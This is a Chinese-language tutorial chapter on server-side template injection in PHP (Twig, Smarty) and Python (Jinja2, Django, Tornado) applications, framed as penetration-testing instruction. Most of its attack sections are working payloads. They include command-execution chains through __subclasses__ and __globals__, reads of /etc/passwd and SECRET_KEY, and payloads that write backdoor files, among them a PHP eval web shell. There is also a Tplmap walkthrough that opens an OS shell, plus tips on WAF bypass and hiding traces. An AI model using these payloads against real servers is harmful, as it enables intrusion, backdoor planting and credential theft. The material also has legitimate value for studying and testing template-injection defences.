# 第一章 模板注入（SSTI）

## 1.1 简介

### 1.1.1 什么是 SSTI？

模板注入（Server-Side Template Injection，简称 SSTI）是指**攻击者通过构造恶意输入，注入到服务器端模板引擎中，破坏模板渲染逻辑，最终执行恶意代码**的漏洞。

其核心原理是：模板引擎的设计目的是 “将用户输入作为数据渲染到模板中”，但当程序未对用户输入进行严格过滤，直接将输入作为 “模板语法” 解析时，攻击者可注入模板语法片段（如变量、函数调用），让模板引擎执行非预期操作（如调用系统函数、读取敏感文件）。

举个生活类比：餐厅的 “定制菜单” 模板为 “今日推荐：{用户输入的菜品}”，正常使用时用户输入 “番茄炒蛋”，渲染结果为 “今日推荐：番茄炒蛋”；若用户输入 “{删除所有菜单文件}”，且系统直接将该输入作为 “模板指令” 执行，就会触发 SSTI 漏洞，删除菜单文件。

SSTI 广泛存在于使用模板引擎的 Web 应用中，不同编程语言对应不同的模板引擎（如 PHP 的 Twig、Python 的 Jinja2），但漏洞本质与利用逻辑一致。

### 1.1.2 SSTI 速查表（核心知识点汇总）

为方便快速查阅与测试，以下是 SSTI 的核心速查表，涵盖漏洞判断、关键语法、常见引擎特征：



| 类别           | 内容                                                                                                                                                            |
| ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **漏洞判断方法**   | 1. 输入`{{7*7}}`，若渲染结果为`49`（而非原字符串），说明模板引擎解析了表达式；2. 输入`{{config}}`（Python）或`{{app.config}}`（PHP），若返回配置信息，证明存在 SSTI；3. 输入特殊字符（如`{#`、`{%`），若返回语法错误，说明模板引擎识别了模板语法。 |
| **通用注入语法**   | - 变量引用：`{{变量名}}`（多数引擎通用，如 Jinja2、Twig）；- 代码块：`{% 代码逻辑 %}`（如循环、条件判断，如`{% for i in [1,2,3] %}{{i}}{% endfor %}`）；- 注释：`{# 注释内容 #}`（模板引擎会忽略注释，可用于测试语法是否被识别）。     |
| **常见模板引擎特征** | - Python-Jinja2：支持`{{().__class__.__bases__}}`获取类继承关系；- Python-Django：默认禁用部分危险语法，需通过`{{settings}}`判断；- PHP-Twig：支持 \`{{app.request.server.all                 |
| **核心利用思路**   | 1. 找到 “可调用的危险类 / 函数”（如 Python 的`os.system`、PHP 的`exec`）；2. 通过模板语法 “拼接调用路径”（如`{{().__class__.__bases__[0].__subclasses__()}}`）；3. 执行恶意操作（如命令执行、文件读写、获取配置）。     |

## 1.2 PHP 中的 SSTI

PHP 生态中常用的模板引擎为**Twig**（Symfony 框架默认）与**Smarty**，两者因设计理念不同，SSTI 的利用方式存在差异 ——Twig 默认安全机制较严格，Smarty 旧版本存在明显漏洞。

### 1.2.1 Twig 模板引擎的 SSTI

Twig 是 PHP 中安全性较高的模板引擎，默认禁用了直接执行 PHP 代码的功能，但仍可通过 “调用框架内置对象” 实现信息泄露或间接攻击。

#### 1. 漏洞场景与特征



* 应用场景：使用 Symfony 框架开发的 Web 应用（如博客、CMS 系统），若将用户输入直接传入`$twig->render()`方法的模板参数中，可能触发 SSTI；

* 特征判断：输入`{{7*7}}`，若返回`49`；输入`{{app.request.server.get('SERVER_ADDR')}}`，若返回服务器 IP，证明存在 SSTI。

#### 2. 利用方法（分场景）

##### 场景 1：信息泄露（最易实现）

通过调用 Twig 的内置对象，获取应用配置、服务器信息等敏感数据：



* 获取服务器环境变量：`{{app.request.server.all|join(',')}}`（返回所有服务器环境变量，如`PATH`、`SERVER_NAME`）；

* 获取应用配置：`{{app.config|join(',')}}`（返回 Symfony 框架的配置信息，如数据库连接参数）；

* 获取 Cookie 信息：`{{app.request.cookies.all|join(',')}}`（返回当前用户的 Cookie，可能包含会话 ID）。

##### 场景 2：命令执行（需特定条件）

Twig 默认禁用`exec`、`system`等命令执行函数，需满足以下条件之一才能实现：



* 应用自定义了 “可调用命令执行的过滤器 / 函数”（如开发者为方便开发，添加了`{{ input|exec }}`的过滤逻辑）；

* 利用框架漏洞（如 Symfony 的特定版本漏洞），通过`app.request`对象构造恶意请求，触发命令执行。

示例（假设存在自定义`exec`过滤器）：



```
{{ "whoami"|exec }}  # 执行whoami命令，返回当前用户

{{ "cat /etc/passwd"|exec }}  # 读取系统敏感文件
```

### 1.2.2 Smarty 模板引擎的 SSTI

Smarty 是 PHP 中历史悠久的模板引擎，**3.1.32 版本之前存在严重 SSTI 漏洞**，支持直接嵌入 PHP 代码执行，漏洞利用门槛极低。

#### 1. 漏洞场景与特征



* 应用场景：使用旧版本 Smarty（如 3.1.29）的 Web 应用，若将用户输入直接作为模板内容渲染（如`$smarty->display("string:{$user_input}")`），会触发 SSTI；

* 特征判断：输入`{php}echo 7*7;{/php}`，若返回`49`，证明存在 SSTI（新版本 Smarty 已移除`{php}`标签）。

#### 2. 利用方法（直接执行代码）

Smarty 旧版本支持多种直接执行 PHP 代码的语法，利用方式简单直接：

##### 方法 1：使用`{php}`标签（最直接）



```
{php}

// 执行系统命令

exec("whoami", \$output);

echo implode("\n", \$output);

// 读取敏感文件

echo file\_get\_contents("/etc/passwd");

// 写入后门文件

file\_put\_contents("/var/www/html/backdoor.php", "\<?php @eval(\\$\_GET\['cmd']);?>");

{/php}
```



* 说明：`{php}`标签内可直接编写任意 PHP 代码，权限与 Web 服务器进程一致（如`www-data`）。

##### 方法 2：使用`{assign}`与`{eval}`组合

若`{php}`标签被禁用，可通过`{assign}`定义变量，再用`{eval}`执行变量中的 PHP 代码：



```
{assign var="cmd" value="system('whoami');"}  # 定义变量cmd，值为PHP代码

{eval var=\$cmd}  # 执行变量中的PHP代码
```

##### 方法 3：利用 Smarty 内置函数

通过 Smarty 的内置函数（如`{include}`）包含恶意文件：



```
{include file="php://filter/read=convert.base64-encode/resource=/etc/passwd"}
```



* 说明：`php://filter`是 PHP 的伪协议，用于读取文件并 Base64 编码（避免特殊字符显示异常），解码后可得到`/etc/passwd`的内容。

## 1.3 Python 中的 SSTI

Python 是 Web 开发的主流语言，常用模板引擎包括**Jinja2**（Flask 框架默认）、**Django 模板**（Django 框架默认）、**Tornado 模板**（Tornado 框架默认）。其中，Jinja2 因灵活性高，成为 SSTI 的高频场景；Django 默认安全机制严格，漏洞利用难度较高。

### 1.3.1 前置知识（Python SSTI 核心基础）

Python SSTI 的利用依赖 “Python 的面向对象特性”—— 通过模板语法遍历 “类与对象的继承关系”，找到并调用危险类 / 函数（如`os.system`、`file`）。以下是必须掌握的核心概念：

#### 1. Python 类与对象的关键属性



* `__class__`：获取对象所属的类（如`"abc".__class__`返回`<class 'str'>`）；

* `__bases__`：获取类的直接父类（如`str.__bases__`返回`(<class 'object'>,)`，因`str`继承自`object`）；

* `__subclasses__()`：获取类的所有子类（如`object.__subclasses__()`返回 Python 中所有继承自`object`的类）；

* `__init__`：类的构造方法，部分类的`__init__`方法包含危险参数（如`file`类的`__init__`可指定文件名）；

* `__globals__`：获取函数 / 方法所在的全局命名空间（如`func.__globals__`返回包含`os`、`sys`等模块的字典）。

#### 2. 核心利用链路（通用逻辑）

Python SSTI 的利用链路可总结为 “四步走”，以 Jinja2 为例：



1. **获取基础类**：通过任意对象（如空字符串`""`、空列表`[]`）的`__class__`获取其类，再通过`__bases__`获取`object`类（所有类的基类）；



```
{{ "".\_\_class\_\_.\_\_bases\_\_\[0] }}  # 结果为\<class 'object'>
```



1. **遍历子类**：调用`object.__subclasses__()`，获取所有子类，从中找到 “危险类”（如`os._wrap_close`、`file`）；



```
{{ "".\_\_class\_\_.\_\_bases\_\_\[0].\_\_subclasses\_\_() }}  # 返回所有子类列表
```



1. **定位危险函数**：通过`__globals__`从危险类中获取`os`模块（包含`system`、`popen`等命令执行函数）；



```
\# 假设os.\_wrap\_close是第123个子类（需根据实际环境调整索引）

{{ "".\_\_class\_\_.\_\_bases\_\_\[0].\_\_subclasses\_\_()\[123].\_\_init\_\_.\_\_globals\_\_\['os'] }}
```



1. **执行恶意操作**：调用`os.system()`或`os.popen()`执行命令，或调用`file`类读写文件；



```
\# 执行whoami命令

{{ "".\_\_class\_\_.\_\_bases\_\_\[0].\_\_subclasses\_\_()\[123].\_\_init\_\_.\_\_globals\_\_\['os'].system('whoami') }}
```

### 1.3.2 Jinja2 模板引擎的 SSTI（Flask 场景）

Jinja2 是 Flask 框架的默认模板引擎，因支持丰富的表达式与函数调用，成为 Python SSTI 的最典型场景，漏洞利用方式灵活。

#### 1. 漏洞场景与特征



* 应用场景：Flask 应用中，若直接将用户输入作为模板渲染（如`return render_template_string(user_input)`），未使用`render_template`（安全，仅渲染指定模板文件），会触发 SSTI；

* 特征判断：输入`{{7*7}}`，若返回`49`；输入`{{config}}`，若返回 Flask 的配置信息（如`SECRET_KEY`），证明存在 SSTI。

#### 2. 常用 Payload（分功能）

##### 功能 1：命令执行（最核心需求）

以下 Payload 适用于多数 Jinja2 场景，需根据`object.__subclasses__()`的实际子类索引调整（可先通过`{{ "".__class__.__bases__[0].__subclasses__() }}`查看索引）：



* Payload1（利用`os._wrap_close`类）：



```
\# 步骤：获取os模块 → 执行system命令（以whoami为例）

{{ "".\_\_class\_\_.\_\_bases\_\_\[0].\_\_subclasses\_\_()\[123].\_\_init\_\_.\_\_globals\_\_\['os'].system('whoami') }}

\# 若返回0（命令执行成功的返回码），可通过popen获取输出：

{{ "".\_\_class\_\_.\_\_bases\_\_\[0].\_\_subclasses\_\_()\[123].\_\_init\_\_.\_\_globals\_\_\['os'].popen('whoami').read() }}
```



* 说明：`os._wrap_close`的索引通常在 120-130 之间（Python 3.7+），需实际测试调整。

- Payload2（无索引依赖，利用`__import__`）：



```
\# 直接导入os模块并执行命令（部分环境支持）

{{ \_\_import\_\_('os').popen('cat /etc/passwd').read() }}
```

##### 功能 2：文件读写



* 读取文件（利用`file`类，Python 2 适用；Python 3 需用`_frozen_importlib_external.FileLoader`）：



```
\# Python 2：

{{ "".\_\_class\_\_.\_\_bases\_\_\[0].\_\_subclasses\_\_()\[40]\('/etc/passwd').read() }}

\# Python 3（假设FileLoader是第55个子类）：

{{ "".\_\_class\_\_.\_\_bases\_\_\[0].\_\_subclasses\_\_()\[55].\_\_init\_\_.\_\_globals\_\_\['\_\_builtins\_\_']\['open']\('/etc/passwd').read() }}
```



* 写入文件（如写入后门）：



```
{{ "".\_\_class\_\_.\_\_bases\_\_\[0].\_\_subclasses\_\_()\[55].\_\_init\_\_.\_\_globals\_\_\['\_\_builtins\_\_']\['open']\('/var/www/html/backdoor.py', 'w').write('import os;os.system(sys.argv\[1])') }}
```

##### 功能 3：获取配置信息



* 获取 Flask 配置（包含`SECRET_KEY`等敏感信息）：



```
{{ config }}  # 直接返回所有配置

{{ config\['SECRET\_KEY'] }}  # 仅返回SECRET\_KEY
```



* 获取请求信息（如 Cookie、用户 IP）：



```
{{ request.cookies }}  # 返回Cookie

{{ request.remote\_addr }}  # 返回用户IP
```

### 1.3.3 Django 模板引擎的 SSTI

Django 是 Python 中安全性较高的 Web 框架，其模板引擎默认禁用了 “直接调用类 / 函数” 的语法，因此 SSTI 漏洞较少，仅在特定场景下可利用。

#### 1. 漏洞场景与特征



* 应用场景：Django 应用中，若使用`Template`类直接渲染用户输入（如`Template(user_input).render(Context())`），且未启用`ALLOW_UNSAFE_RAW`（Django 1.8 + 默认禁用），可能存在有限的 SSTI；

* 特征判断：输入`{{7*7}}`，若返回`49`；输入`{{settings}}`，若返回 Django 配置，证明存在 SSTI。

#### 2. 利用限制与方法

Django 模板引擎的核心限制：**禁止直接访问**`__class__`**、**`__bases__`**等特殊属性**，因此无法像 Jinja2 那样遍历类继承关系。仅能利用 “内置变量与过滤器” 实现有限操作：



* 信息泄露：



```
{{ settings }}  # 返回Django配置（如数据库连接信息、SECRET\_KEY）

{{ request.META }}  # 返回请求的元数据（如服务器IP、用户UA）
```



* 有限的代码执行（需特定条件）：

  仅当应用自定义了 “危险的模板标签 / 过滤器”（如开发者添加了`{% execute_cmd cmd %}`的标签），才能执行命令，默认场景下无法实现命令执行。

### 1.3.4 Tornado 模板引擎的 SSTI

Tornado 是 Python 的异步 Web 框架，其模板引擎语法与 Jinja2 类似，但安全性介于 Jinja2 与 Django 之间，SSTI 利用方式与 Jinja2 部分兼容。

#### 1. 漏洞场景与特征



* 应用场景：Tornado 应用中，若使用`Template`类渲染用户输入（如`tornado.template.Template(user_input).generate()`），未对输入进行过滤，会触发 SSTI；

* 特征判断：通过简单输入即可快速判断目标是否存在 Tornado SSTI 漏洞，步骤如下：



1. **语法识别测试**：向待测试参数（如`content`、`template`）输入`{{7*7}}`，若页面返回`49`（而非原字符串`{{7*7}}`），说明模板引擎解析了表达式；

2. **框架特征测试**：输入`{{ handler.settings }}`，若返回 Tornado 应用配置（如`{'debug': True, 'port': 8888}`），证明目标使用 Tornado 框架且存在 SSTI；

3. **错误触发测试**：输入`{{ unknown_variable }}`（不存在的变量），若页面返回 Tornado 模板错误信息（如`TemplateError: 'unknown_variable' is undefined`），进一步确认漏洞存在。
#### 2. 常用 Payload（分功能）

Tornado 模板支持访问对象属性与方法，虽部分危险操作受限制，但可通过类似 Jinja2 的思路构造 Payload：

##### 功能 1：命令执行（依赖环境支持）



* Payload1（利用`__import__`导入 os 模块）：



```
{{ \_\_import\_\_('os').popen('whoami').read() }}
```



* 说明：若 Tornado 未禁用`__import__`函数，可直接导入 os 模块执行命令，返回结果会直接渲染在页面上。

- Payload2（遍历子类获取危险函数，Python 3 适用）：



```
\# 步骤：获取object类 → 遍历子类找到os.\_wrap\_close → 调用os.system

{{ "".\_\_class\_\_.\_\_bases\_\_\[0].\_\_subclasses\_\_()\[123].\_\_init\_\_.\_\_globals\_\_\['os'].popen('cat /etc/passwd').read() }}
```



* 注意：子类索引需根据实际 Python 版本调整（同 Jinja2，Python 3.7 + 中`os._wrap_close`索引通常在 120-130 区间）。

##### 功能 2：文件读写



* 读取文件（利用`builtins.open`）：



```
{{ \_\_import\_\_('builtins').open('/etc/passwd', 'r').read() }}
```



* 写入文件（创建后门脚本）：



```
{{ \_\_import\_\_('builtins').open('/var/www/tornado\_backdoor.py', 'w').write('import os;print(os.popen(sys.argv\[1]).read())') }}
```

##### 功能 3：获取配置信息



* 获取 Tornado 应用配置（如端口、调试模式）：



```
{{ handler.settings }}  # 返回应用配置，包含'debug'、'port'等关键信息

{{ request.headers }}  # 返回请求头信息，如User-Agent、Cookie
```

### 1.3.5 Python SSTI 常用 Payload 汇总（跨引擎通用）

为方便测试，整理 Python 生态下 Jinja2、Tornado 通用的高频 Payload，按 “利用难度” 排序：



| 利用目标           | Payload（通用版）                                                                                                         | 适用引擎           | 说明                                                |
| -------------- | -------------------------------------------------------------------------------------------------------------------- | -------------- | ------------------------------------------------- |
| 命令执行（简单）       | `{{ __import__('os').popen('whoami').read() }}`                                                                      | Jinja2、Tornado | 直接导入 os 模块，无需遍历子类，适用于未禁用`__import__`的环境           |
| 命令执行（通用）       | `{{ "".__class__.__bases__[0].__subclasses__()[123].__init__.__globals__['os'].popen('ls').read() }}`                | Jinja2、Tornado | 依赖`os._wrap_close`子类，需调整索引，兼容性强（多数 Python 3 环境支持） |
| 读取文件           | `{{ __import__('builtins').open('/etc/passwd').read() }}`                                                            | Jinja2、Tornado | 利用 Python 内置`builtins.open`函数，避免依赖第三方类            |
| 获取 SECRET\_KEY | `{{ config['SECRET_KEY'] }}`（Jinja2）/ `{{ handler.settings['secret_key'] }}`（Tornado）                                | Jinja2、Tornado | 用于获取框架核心配置，可进一步用于会话伪造等攻击                          |
| 代码执行（进阶）       | `{{ "".__class__.__bases__[0].__subclasses__()[40]('/tmp/test.py', 'w').write('import os;os.system("calc.exe")') }}` | Jinja2、Tornado | 写入恶意 Python 脚本，后续通过其他方式触发执行（如访问脚本路径）              |

### 1.3.6 利用工具进行自动化测试（SSTI 专项工具）

手动构造 Payload 效率低，且易遗漏边缘场景，需借助自动化工具实现 “漏洞探测→Payload 生成→利用验证” 全流程。以下是针对 Python SSTI 的主流工具及使用方法：

#### 1. 工具选型（按功能分类）



| 工具名称                             | 核心功能                                 | 适用场景                                | 优点                      | 缺点               |
| -------------------------------- | ------------------------------------ | ----------------------------------- | ----------------------- | ---------------- |
| **Tplmap**                       | 自动探测 SSTI 漏洞、生成适配 Payload、执行命令 / 读文件 | Jinja2、Django、Tornado 等所有 Python 引擎 | 支持多引擎适配，无需手动调整 Payload  | 对部分自定义模板引擎支持不足   |
| **Burp Suite + SSTI Scanner 插件** | 被动扫描 SSTI 漏洞、检测模板引擎类型                | 所有 Web 应用（含 Python/PHP）             | 集成 Burp 工作流，适合渗透测试全流程   | 仅探测漏洞，不支持自动利用    |
| **SSTImap**                      | 类似 Tplmap，支持更多 Payload 变种、支持代理转发     | 以 Python 引擎为主，兼容 PHP-Twig           | 开源可自定义 Payload，支持复杂网络环境 | 维护频率较低，部分新引擎适配滞后 |

#### 2. 核心工具：Tplmap（自动化利用首选）

Tplmap 是 Python SSTI 领域最成熟的工具，支持 “漏洞探测→命令交互” 全自动化，适合新手入门。

##### （1）环境准备



* 安装方式（Python 3 环境）：



```
\# 从GitHub克隆源码

git clone https://github.com/epinna/tplmap.git

\# 安装依赖

cd tplmap && pip install -r requirements.txt
```



* 验证安装：执行`python ``tplmap.py`` -h`，若输出帮助信息，说明安装成功。

##### （2）核心命令与参数

Tplmap 的核心逻辑是 “指定目标 URL 与参数，工具自动探测是否存在 SSTI 并生成 Payload”，常用参数如下：



| 参数              | 作用                                | 示例                                         |
| --------------- | --------------------------------- | ------------------------------------------ |
| `-u URL`        | 指定目标 URL（必须包含待测试参数，如`?name=test`） | `-u http://127.0.0.1:5000/hello?name=test` |
| `-p PARAM`      | 指定待测试的参数名（若 URL 中只有一个参数，可省略）      | `-p name`                                  |
| `-e ENGINE`     | 手动指定模板引擎（可选，工具默认自动探测）             | `-e jinja2`                                |
| `--os-shell`    | 获取交互式系统 Shell（漏洞验证成功后使用，核心功能）     | `--os-shell`                               |
| `--read FILE`   | 读取目标服务器文件（如`/etc/passwd`）         | `--read /etc/passwd`                       |
| `--proxy PROXY` | 设置代理（如 Burp Suite 代理，用于抓包分析）      | `--proxy http://127.0.0.1:8080`            |

##### （3）实操案例（测试 Flask-Jinja2 应用）

假设目标应用为 Flask 开发，URL 为`http://127.0.0.1:5000/hello?name=test`（`name`参数存在 SSTI 漏洞），使用 Tplmap 测试流程如下：



1. **步骤 1：漏洞探测（自动识别引擎与漏洞）**

   执行命令：



```
python tplmap.py -u http://127.0.0.1:5000/hello?name=test
```

工具输出如下（关键信息已标注）：



```
\[+] Tplmap 0.5

\[+] Testing if GET parameter 'name' is injectable

\[+] Smarty plugin is testing rendering with tag '\*'

\[+] Jinja2 plugin is testing rendering with tag '{{\*}}'

\[+] Detected Jinja2 template engine

\[+] SSTI vulnerability found in parameter 'name'
```



* 结论：工具自动识别出`name`参数存在 SSTI，且模板引擎为 Jinja2。

1. **步骤 2：获取交互式 Shell（执行命令）**

   在探测成功的基础上，添加`--os-shell`参数获取 Shell：



```
python tplmap.py -u http://127.0.0.1:5000/hello?name=test --os-shell
```

工具输出如下（进入交互式 Shell）：



```
\[+] Starting OS shell (Jinja2)

os-shell> whoami

www-data  # 工具返回命令执行结果

os-shell> ls /var/www

app.py  templates  static  # 查看Web目录文件

os-shell> exit  # 退出Shell
```



* 说明：工具会自动生成适配 Jinja2 的 Payload，无需手动调整索引，直接返回命令输出。

1. **步骤 3：读取敏感文件（如 /etc/passwd）**

   执行`--read`参数读取文件：



```
python tplmap.py -u http://127.0.0.1:5000/hello?name=test --read /etc/passwd
```

工具会直接输出文件内容（Base64 解码后的明文）：



```
\[+] Reading file '/etc/passwd'

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

...
```

#### 3. 辅助工具：Burp Suite + SSTI Scanner 插件

Burp Suite 是渗透测试必备工具，结合 SSTI Scanner 插件可实现 “被动扫描”（在浏览目标时自动检测 SSTI 漏洞）。

##### （1）插件安装



1. 打开 Burp Suite，进入 “Extender → BApp Store”；

2. 在搜索框输入 “SSTI Scanner”，点击 “Install” 安装；

3. 安装完成后，在 “Extender → Extensions” 中确认插件状态为 “Loaded”。

##### （2）使用方法



1. 配置 Burp 代理（浏览器设置代理为`127.0.0.1:8080`）；

2. 浏览目标 Python Web 应用（如访问`http://127.0.0.1:5000/hello?name=test`）；

3. 插件会自动拦截请求，检测参数是否存在 SSTI 漏洞；

4. 若发现漏洞，会在 “Dashboard → Issues” 中显示漏洞详情（如 “Server-Side Template Injection (Jinja2)”），并给出初步验证 Payload。

##### （3）优势与局限



* 优势：无需手动输入命令，适合大规模扫描（如测试整个 Web 应用的所有参数）；

* 局限：仅能探测漏洞，无法自动执行命令或读取文件，需结合 Tplmap 进一步利用。

#### 4. 工具使用注意事项



1. **合法授权优先**：所有测试必须获得目标所有者的书面授权，禁止对未授权目标使用工具（违反《网络安全法》《刑法》第 285/286 条）；

2. **避免破坏性操作**：测试时优先使用`whoami`、`ls`等无破坏性命令，禁止执行`rm -rf /`、`format`等危险操作；

3. **隐藏测试痕迹**：测试完成后，删除工具生成的临时文件（如 Tplmap 写入的后门脚本），清理测试日志；

4. **适配目标环境**：部分应用存在 WAF（Web 应用防火墙），会拦截工具生成的 Payload，需在工具中配置代理（如 Burp Suite），手动修改 Payload 绕过 WAF。

